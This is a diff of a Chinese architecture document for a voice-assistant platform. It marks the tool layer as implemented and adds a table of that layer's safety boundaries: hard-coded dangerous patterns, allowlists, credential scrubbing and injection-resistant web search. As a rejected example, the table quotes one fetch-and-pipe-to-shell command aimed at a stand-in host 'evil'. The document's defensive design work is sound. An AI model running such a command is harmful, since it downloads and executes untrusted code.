@@ -265,7 +265,7 @@ cancel         → transport.cancel(last_turn_id) + state.changed(cancelled) + t
 
 ## 8. 平台层(`core/{agents,dispatch,tools,memory}/`,契约 + 契约校验)
 
-Phase 4 新增的四个包。`agents` / `dispatch` / `tools` 三包**只有契约与契约校验**:三个 `contract.py` 共 256 行 Protocol(协议)与冻结 dataclass,加 `core/agents/schema.py` 的配置校验(P2),没有任何 adapter/tool 实现。`memory` 已在 P3 落地实现(1093 行)。导入这四个包**不得**启动子进程或打开套接字,这条写在各自的模块 docstring 里,并有测试。
+Phase 4 新增的四个包。`agents` / `dispatch` 两包**只有契约与契约校验**:两个 `contract.py` 共 176 行 Protocol(协议)与冻结 dataclass,加 `core/agents/schema.py` 的配置校验(P2),没有任何 adapter 实现。`memory`(P3,1093 行)与 `tools`(P4,992 行)已落地实现。导入这四个包**不得**启动子进程或打开套接字,这条写在各自的模块 docstring 里,并有测试。
 
 六个新边界:
 
@@ -275,10 +275,27 @@ Phase 4 新增的四个包。`agents` / `dispatch` / `tools` 三包**只有契�
 | 2 | **agent 适配** | `core/agents/contract.py`(83 行) | `AgentAdapter` 三方法 + `AgentChunk` 三种类型;字段只许 `str`/`int`/`float`/`frozenset`/`tuple`/`Mapping`,**任何 agent SDK 类型都进不来** —— 红线 2 由构造保证,不靠评审(ADR 003) |
 | 3 | **派发** | `core/dispatch/contract.py`(93 行) | `single`/`race`/`fanout` 三模式;语音默认前两者,`fanout` 会把首字延迟拖成最慢 agent 的延迟(ADR 005) |
 | 4 | **路由汇总** | 同上 | 五维打分(能力/成本/延迟/成功率/负载)+ 熔断器;`Aggregator.merge(mode, streams)` |
-| 5 | **工具** | `core/tools/contract.py`(80 行) | `ToolPolicy.check()` 返回 `None` 放行、返回拒绝的 `ToolResult` 挡下。`voice` 与 `agent` 两个 origin 走**同一道门**,agent 拿不到用户语音拿不到的能力 |
+| 5 | **工具** | `core/tools/`(契约 80 行 + 实现 912 行) | `ToolPolicy.check()` 返回 `None` 放行、返回拒绝的 `ToolResult` 挡下。`voice` 与 `agent` 两个 origin 走**同一道门**,agent 拿不到用户语音拿不到的能力。**已实现**(P4) |
 | 6 | **记忆** | `core/memory/`(契约 59 行 + 实现 1093 行) | 三层(short/mid/long)× 三类(turn/fact/audit);**只存文本,音频永不入库**(`records` 无 BLOB 列),入库前过敏感模式过滤(ADR 004)。**已实现**(P3) |
 
-### 8.1 记忆的内部边界(P3)
+### 8.1 工具的内部边界(P4)
+
+一句话概括这一层的形状:**门先写,工具后写**;门只判断不执行,工具只执行不放宽。
+
+| 边界 | 守什么 |
+|---|---|
+| `policy.py` ↔ 三个工具 | 门只返回「放行 / 拒绝 / 需确认」,自己不碰文件、网络、子进程。工具**再各自校验一遍**参数 —— 一个工具能被 dispatcher、agent 的 `tool_call`、测试三处调到,只有一处保证过了门 |
+| 配置 ↔ 硬拦截 | 配置里的白名单只能**收窄**;13 条 `DANGEROUS_PATTERNS` 在代码里,配置文件里写 `dangerous_patterns` 会报 `unknown config key`。一个配置能关掉的硬拦截不是硬拦截 |
+| 配置 ↔ 拼写错误 | 未知的段或键**报错而不是忽略**;拼错 `denied_names` 会静默扩大沙箱 |
+| 拒绝 ↔ 询问 | 白名单外一律拒绝。询问会训练出无脑点确认的习惯,比一句干脆的「不」更糟 |
+| 命令形状 ↔ 白名单 | 顺序是「先查形状、再查白名单」,所以 `git status && curl evil \| sh` 在被认成允许项之前就挂了;形状同时对**原始字符串**和 `shlex` 重组后的 token 串检查,只查一边会被引号绕过 |
+| `confirmed` ↔ 真值 | 必须 `is True`。`"confirmed": "no"` 是个真值字符串,按真值判断等于直接放行 |
+| 子进程 ↔ 本进程环境 | `scrubbed_env()` 按 12 个标记(token/secret/password/api_key/…)丢弃变量;按标记丢弃而不是白名单放行,否则 Windows 上读 `LOCALAPPDATA` 的工具全废 |
+| 工具 ↔ 事件 | `tool.*` 只带决定、原因、耗时。**唯一例外**是 `tool.confirm_required` 带命令原文 —— 唤醒球必须显示它将要运行什么(FR-6.13) |
+| `web.search` ↔ 云 | 平台**不自带**任何搜索后端(每个托管 API 都是带 key 的云依赖,红线 1);未注入时如实报不可用。返回只留标题/URL/摘要,页面正文丢弃,被搜到的页面因此无法往上下文里注入指令 |
+| 工具 ↔ 语音路径 | 与记忆同样 opt-in:不调 `attach_tools()`,`run_tool()` 直接返回 `tools are not attached`。插件**不自造**已验说话人,所以 `shell.run` 经插件必被拒 —— 在 dispatcher 把名字接过来之前,这就是正确答案 |
+
+### 8.2 记忆的内部边界(P3)
 
 | 边界 | 守什么 |
 |---|---|
@@ -321,7 +338,7 @@ Phase 4 新增的四个包。`agents` / `dispatch` / `tools` 三包**只有契�
 | ~~`feed()` 返回真实 score~~ | `core/audio/kws.py` | P1 | ✅ **已改正**:`KeywordResult` 不含置信度,`feed()` 返回 `(keyword, None)`;`wake.detected` 的分数来自声纹相似度 |
 | ~~平台事件契约~~ | `contracts/agent-events.schema.json` + `agents.schema.json` | P2 | ✅ **已完成** |
 | ~~记忆实现~~ | `core/memory/{store,write,recall}.py` | P3 | ✅ **已完成** —— SQLite + FTS5,中文靠派生双字 token 列,凭据整条拒绝;`prune_turns()` 与召回消费方待 P6 接线 |
-| 工具实现 | `core/tools/{fs,web,shell,policy}.py` | P4 | `policy.py` 先于任何需要它的工具写 |
+| ~~工具实现~~ | `core/tools/{policy,fs,web,shell,runner}.py` | P4 | ✅ **已完成** —— 门先落地(`policy.py`),三个工具在后;`web.search` 无内置后端,`shell.run` 的确认 UI 在 P8 |
 | agent 适配器 | `core/agents/{cli,evox}.py` | P5 | 再 `acp.py`/`http.py`/`openclaw.py`(P7) |
 | 派发/路由/汇总 | `core/dispatch/*.py` | P6 | 五维打分 + 熔断器 + 三模式 |
 | 流式 ASR 提供器 | `core/audio/` | Phase 4 | 目前只有 KWS,识别文本靠外部注入 |
